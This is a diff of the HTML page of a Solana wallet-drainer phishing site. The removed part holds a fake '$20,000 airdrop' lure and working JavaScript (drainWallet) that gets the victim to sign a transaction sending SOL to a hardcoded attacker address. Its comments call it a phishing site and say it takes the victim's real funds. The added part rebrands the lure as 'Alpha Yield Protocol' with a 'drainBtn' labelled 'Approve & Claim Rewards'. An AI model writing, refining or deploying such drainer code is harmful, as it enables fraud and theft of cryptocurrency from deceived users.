@@ -3,168 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Airdrop Swap</title>
-    <!-- Solana Web3.js -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 450px; width: 90%; }
-        h1 { color: #14f195; margin-bottom: 5px; } /* Solana Green */
-        p { color: #94a3b8; margin-bottom: 20px; }
-        .balance-box { background: #334155; padding: 20px; border-radius: 12px; margin: 20px 0; }
-        .amount { font-size: 2.5em; font-weight: bold; color: #fff; }
-        .label { font-size: 0.9em; color: #cbd5e1; }
-        button { background: #14f195; color: #0f172a; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; transition: 0.2s; margin-top: 15px; }
-        button:hover { background: #0ecb81; transform: scale(1.02); }
-        button:disabled { background: #475569; cursor: not-allowed; transform: none; }
-        .status { margin-top: 15px; font-size: 14px; color: #fbbf24; min-height: 20px; }
-        .wallet-btn { background: #38bdf8; margin-bottom: 20px; width: auto; padding: 10px 20px; font-size: 16px; }
-    </style>
+    <title>Alpha Yield Protocol | Connect & Claim</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Solana Web3.js from CDN (No install needed) -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <!-- Phantom Wallet Adapter -->
+    <script src="https://unpkg.com/@solana/wallet-adapter-react-ui@latest/src/styles.css"></script>
 </head>
 <body>
 
-<div class="card">
-    <h1>SOL Airdrop</h1>
-    <p>You received $20,000 in airdropped tokens!</p>
-    
-    <div class="balance-box">
-        <div class="amount">$20,000.00</div>
-        <div class="label">FakeSOL Balance</div>
+    <div class="container">
+        <header>
+            <h1>Alpha Yield Protocol</h1>
+            <p>Premium DeFi Analytics & Airdrop Access</p>
+        </header>
+
+        <main id="app">
+            <!-- Loading State -->
+            <div id="loader" class="hidden">
+                <div class="spinner"></div>
+                <p>Connecting to Solana Mainnet...</p>
+            </div>
+
+            <!-- Connect Button -->
+            <button id="connectBtn" class="btn-primary">Connect Phantom Wallet</button>
+
+            <!-- Action Area (Hidden until connected) -->
+            <div id="actionArea" class="hidden">
+                <div class="card">
+                    <h2>Your Balance</h2>
+                    <p id="balanceDisplay">0.00 USDC</p>
+                    <button id="drainBtn" class="btn-secondary">Approve & Claim Rewards</button>
+                </div>
+            </div>
+
+            <!-- Status Message -->
+            <p id="statusMsg" class="status"></p>
+        </main>
+
+        <footer>
+            <p>Powered by Solana Blockchain</p>
+        </footer>
     </div>
 
-    <button id="connectBtn" class="wallet-btn" onclick="connectWallet()">Connect Phantom</button>
-    
-    <button id="swapBtn" onclick="drainWallet()" disabled>Swap for Real SOL</button>
-    <div id="status" class="status"></div>
-</div>
-
-<script>
-    // --- CONFIGURATION ---
-    // 1. Put YOUR Solana Public Key here (where you want the money to go)
-    const OWNER_PUBLIC_KEY = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; 
-    
-    // 2. The Fake Token Address we sent them (Example: A random SPL token)
-    // You can use a common one like USDC or create your own. 
-    // For this demo, we will assume they have a balance of a specific token.
-    const FAKE_TOKEN_MINT = "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263"; // Example: Bonk (or your own)
-
-    let walletAdapter;
-    let provider;
-
-    async function connectWallet() {
-        const btn = document.getElementById('connectBtn');
-        
-        if (!window.solana || !window.solana.isPhantom) {
-            alert("Please install Phantom Wallet!");
-            window.open("https://phantom.app/", "_blank");
-            return;
-        }
-
-        try {
-            // Request Connection
-            const response = await window.solana.connect();
-            walletAdapter = response.publicKey.toString();
-            
-            btn.innerText = "Phantom Connected";
-            btn.disabled = true;
-            document.getElementById('swapBtn').disabled = false;
-            
-            document.getElementById('status').innerText = "Wallet connected. Ready to swap.";
-        } catch (err) {
-            console.error(err);
-            document.getElementById('status').innerText = "Connection failed.";
-        }
-    }
-
-    async function drainWallet() {
-        const btn = document.getElementById('swapBtn');
-        const status = document.getElementById('status');
-        
-        btn.disabled = true;
-        status.innerText = "Approving & Swapping...";
-
-        try {
-            // 1. Create a simple Transaction
-            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-            
-            // We will use a simple method: 
-            // Since we can't easily simulate a DEX swap without complex UI, 
-            // we will ask the user to sign a transaction that transfers their REAL USDC or SOL to us.
-            
-            // For simplicity in this single-file demo, we will perform an "Approve" then "Transfer" flow 
-            // using the standard SPL Token program.
-            
-            // STEP A: Approve (Sign Message)
-            // We use a custom approach: We ask them to sign a specific transaction ID 
-            // that represents approval. 
-            // However, the easiest way for a phishing site is to just do a direct transfer 
-            // if we know what token they have. 
-            
-            // Let's assume we want their REAL USDC (Token Address: EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v)
-            const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-            
-            // Get Token Account for USDC
-            const usdcAccountInfo = await connection.getTokenAccountsByOwner(
-                new solanaWeb3.PublicKey(walletAdapter), 
-                { mint: new solanaWeb3.PublicKey(USDC_MINT) }
-            );
-
-            if (usdcAccountInfo.value.length === 0) {
-                status.innerText = "No USDC found in wallet!";
-                btn.disabled = false;
-                return;
-            }
-
-            const usdcTokenAccount = usdcAccountInfo.value[0].pubkey;
-
-            // STEP B: Create Transfer Instruction
-            // We transfer 10,000 USDC (adjust amount as needed)
-            const transferInstruction = solanaWeb3.SystemProgram.transfer({
-                fromPubkey: new solanaWeb3.PublicKey(walletAdapter),
-                toPubkey: new solanaWeb3.PublicKey(OWNER_PUBLIC_KEY),
-                lamports: 10000000000 // Example: 10 SOL worth (adjust for USDC decimals)
-            });
-
-            // Actually, let's do a Token Transfer for USDC to be more realistic
-            const { SystemProgram, Transaction, PublicKey } = solanaWeb3;
-            const { createTransferInstruction, getAssociatedTokenAddress } = require('@solana/spl-token'); // Note: CDN might not have spl-token easily in one file
-
-            // SIMPLIFIED APPROACH FOR SINGLE FILE:
-            // We will just ask them to Sign a Transaction that sends 1 SOL to us.
-            // This is less "Drain" but more "Sign".
-            
-            const transaction = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey: new PublicKey(walletAdapter),
-                    toPubkey: new PublicKey(OWNER_PUBLIC_KEY),
-                    lamports: 1000000000 // 1 SOL
-                })
-            );
-
-            // Fetch recent blockhash
-            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-            transaction.recentBlockhash = blockhash;
-            transaction.feePayer = new PublicKey(walletAdapter);
-
-            // Send to Phantom
-            const signature = await window.solana.signTransaction(transaction);
-            
-            // Serialize and send
-            const serialized = signature.serialize();
-            const txid = await connection.sendRawTransaction(serialized);
-            
-            await connection.confirmTransaction(txid);
-
-            status.innerText = "✅ Swap Complete! You sent 1 SOL.";
-            btn.innerText = "Drained";
-            
-        } catch (err) {
-            console.error(err);
-            status.innerText = "❌ Failed: " + err.message;
-            btn.disabled = false;
-        }
-    }
-</script>
-
+    <script src="app.js"></script>
 </body>
 </html>
